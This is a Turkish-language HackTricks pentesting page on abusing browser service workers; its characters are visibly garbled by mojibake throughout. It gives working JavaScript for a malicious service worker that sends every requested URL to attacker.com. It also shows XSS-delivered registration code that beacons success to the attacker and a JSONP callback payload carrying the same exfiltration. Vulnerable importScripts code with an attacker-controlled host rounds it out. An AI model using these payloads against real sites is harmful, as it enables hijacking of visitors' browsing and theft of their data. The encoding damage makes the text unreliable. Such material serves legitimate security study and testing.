# Service Worker'larÄ± KÃ¶tÃ¼ye Kullanma



<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity ÅŸirketinde** Ã§alÄ±ÅŸÄ±yor musunuz? **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* [**Resmi PEASS & HackTricks swag'Ä±nÄ±**](https://peass.creator-spring.com) alÄ±n
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter**'da beni takip edin ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **gÃ¶ndererek paylaÅŸÄ±n**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En Ã¶nemli olan zayÄ±flÄ±klarÄ± bulun, bÃ¶ylece daha hÄ±zlÄ± dÃ¼zeltebilirsiniz. Intruder saldÄ±rÄ± yÃ¼zeyinizi takip eder, proaktif tehdit taramalarÄ± yapar, API'lerden web uygulamalarÄ±na ve bulut sistemlerine kadar tÃ¼m teknoloji yÄ±ÄŸÄ±nÄ±nÄ±zda sorunlarÄ± bulur. [**Ãœcretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugÃ¼n.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Temel Bilgiler

Bir **service worker**, tarayÄ±cÄ±nÄ±z tarafÄ±ndan arka planda Ã§alÄ±ÅŸtÄ±rÄ±lan, herhangi bir web sayfasÄ±ndan baÄŸÄ±msÄ±z olarak Ã§alÄ±ÅŸan, web sayfasÄ± veya kullanÄ±cÄ± etkileÅŸimi gerektirmeyen Ã¶zellikleri etkinleÅŸtiren bir betiktir, bu nedenle **Ã§evrimdÄ±ÅŸÄ± ve arka plan iÅŸleme** yeteneklerini artÄ±rÄ±r. Service worker'lar hakkÄ±nda detaylÄ± bilgiye [buradan](https://developers.google.com/web/fundamentals/primers/service-workers) ulaÅŸabilirsiniz. SavunmasÄ±z bir web alanÄ±nda service worker'larÄ± kÃ¶tÃ¼ye kullanan saldÄ±rganlar, o alan iÃ§indeki tÃ¼m sayfalarla kurbanÄ±n etkileÅŸimini kontrol edebilirler.


### Varolan Service Worker'larÄ± Kontrol Etme

Varolan service worker'larÄ±, **GeliÅŸtirici AraÃ§larÄ±**'ndaki **Uygulama** sekmesinin **Service Worker'lar** bÃ¶lÃ¼mÃ¼nde kontrol edebilirsiniz. BaÅŸka bir yÃ¶ntem ise daha detaylÄ± bir gÃ¶rÃ¼nÃ¼m iÃ§in [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) adresini ziyaret etmektir.

### Bildirimleri Ä°letme

**Bildirim izinleri**, bir **service worker'Ä±n** doÄŸrudan kullanÄ±cÄ± etkileÅŸimi olmadan sunucuyla iletiÅŸim kurma yeteneÄŸini etkiler. Ä°zinler reddedildiÄŸinde, service worker'Ä±n sÃ¼rekli bir tehdit oluÅŸturma potansiyelini sÄ±nÄ±rlar. Tam tersine, izinlerin verilmesi, potansiyel saldÄ±rÄ±larÄ±n alÄ±nmasÄ±nÄ± ve yÃ¼rÃ¼tÃ¼lmesini mÃ¼mkÃ¼n kÄ±larak gÃ¼venlik risklerini artÄ±rÄ±r.

## Bir Service Worker OluÅŸturarak SaldÄ±rÄ± Yapma

Bu zafiyeti sÃ¶mÃ¼rmek iÃ§in aÅŸaÄŸÄ±dakileri bulmanÄ±z gerekmektedir:

* Sunucuya **keyfi JS** dosyalarÄ± yÃ¼klemek iÃ§in bir yol ve yÃ¼klenen JS dosyasÄ±nÄ±n **service worker'Ä±nÄ± yÃ¼klemek iÃ§in bir XSS** bulunmasÄ±
* **ManipÃ¼le edilebilen bir JSONP isteÄŸi** olan bir **zafiyetli** ve bir **payload ile JSONP'yi yÃ¼kleyecek bir XSS** bulunmasÄ±, bu da **zararlÄ± bir service worker'Ä± yÃ¼kleyecektir**.

AÅŸaÄŸÄ±daki Ã¶rnekte, **fetch** olayÄ±nÄ± dinleyecek ve her alÄ±nan URL'yi saldÄ±rganÄ±n sunucusuna gÃ¶nderecek bir **yeni bir service worker** kaydetmek iÃ§in gereken kodu sunuyorum (bu kodu **sunucuya yÃ¼klemek** veya **zafiyetli bir JSONP** yanÄ±tÄ±yla yÃ¼klemek iÃ§in kullanmanÄ±z gerekecektir):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Ve iÅŸte iÅŸÃ§iyi kaydedecek olan kod (XSS'yi istismar ederek yÃ¼rÃ¼tebilmeniz gereken kod). Bu durumda, hizmet iÅŸÃ§isinin kaydÄ±nÄ±n baÅŸarÄ±lÄ± olup olmadÄ±ÄŸÄ±nÄ± bildiren bir GET isteÄŸi, saldÄ±rganÄ±n sunucusuna gÃ¶nderilecektir:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
ZararlÄ± bir JSONP uÃ§ noktasÄ±nÄ± istismar etmek durumunda, deÄŸeri `var sw` iÃ§ine yerleÅŸtirmelisiniz. Ã–rneÄŸin:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
**Shadow Workers** adlÄ± bir **C2**, Service Worker'larÄ± sÃ¶mÃ¼rmek iÃ§in kullanÄ±lan bir araÃ§tÄ±r ve bu zafiyetleri istismar etmek iÃ§in oldukÃ§a faydalÄ± olacaktÄ±r.

**24 saatlik Ã¶nbellek yÃ¶nergesi**, kÃ¶tÃ¼ niyetli veya ele geÃ§irilmiÅŸ bir **service worker'Ä±n (SW)** Ã¶mrÃ¼nÃ¼, bir XSS zafiyetinin dÃ¼zeltilmesinden sonra en fazla 24 saat olarak sÄ±nÄ±rlar, Ã§evrimiÃ§i istemci durumu varsayÄ±larak. Zafiyeti en aza indirmek iÃ§in site iÅŸletmecileri, SW betiÄŸinin Time-To-Live (TTL) deÄŸerini dÃ¼ÅŸÃ¼rebilir. GeliÅŸtiricilere hÄ±zlÄ± devre dÄ±ÅŸÄ± bÄ±rakma iÃ§in bir [**service worker kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) oluÅŸturmalarÄ± da Ã¶nerilir.

## DOM Clobbering ile SW'de `importScripts`'in KÃ¶tÃ¼ye KullanÄ±lmasÄ±

Bir Service Worker'dan Ã§aÄŸrÄ±lan **`importScripts`** fonksiyonu, **farklÄ± bir etki alanÄ±ndan bir betiÄŸi iÃ§e aktarabilir**. Bu fonksiyon, bir saldÄ±rganÄ±n deÄŸiÅŸtirebileceÄŸi bir **parametre kullanÄ±larak Ã§aÄŸrÄ±lÄ±rsa**, XSS saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebilir ve **kendi etki alanÄ±ndan bir JS betiÄŸini iÃ§e aktarabilir**.

**Bu, CSP korumalarÄ±nÄ± bile atlatÄ±r.**

**Ã–rnek zafiyetli kod:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### DOM Clobbering ile

DOM Clobbering hakkÄ±nda daha fazla bilgi iÃ§in ÅŸu adrese bakÄ±n:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

EÄŸer SW'nin **`importScripts`** Ã§aÄŸrÄ±sÄ± iÃ§in kullandÄ±ÄŸÄ± URL/domain, **bir HTML Ã¶ÄŸesi iÃ§indeyse**, DOM Clobbering kullanarak SW'nin **kendi alanÄ±nÄ±zdan bir betik yÃ¼klemesini saÄŸlamak mÃ¼mkÃ¼ndÃ¼r**.

Bunun bir Ã¶rneÄŸi iÃ§in referans linkine bakÄ±n.

## Referanslar

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En Ã¶nemli olan zafiyetleri bulun ve daha hÄ±zlÄ± dÃ¼zeltin. Intruder saldÄ±rÄ± yÃ¼zeyinizi takip eder, proaktif tehdit taramalarÄ± yapar, API'lerden web uygulamalarÄ±na ve bulut sistemlerine kadar tÃ¼m teknoloji yÄ±ÄŸÄ±nÄ±nÄ±zda sorunlarÄ± bulur. [**Ãœcretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugÃ¼n.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

* Bir **cybersecurity ÅŸirketinde** Ã§alÄ±ÅŸÄ±yor musunuz? **Åirketinizi HackTricks'te reklamÄ±nÄ± yapmak** ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne eriÅŸmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan Ã¶zel [**NFT'lerimizi**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**hacktricks repo'ya**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo'ya**](https://github.com/carlospolop/hacktricks-cloud) **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
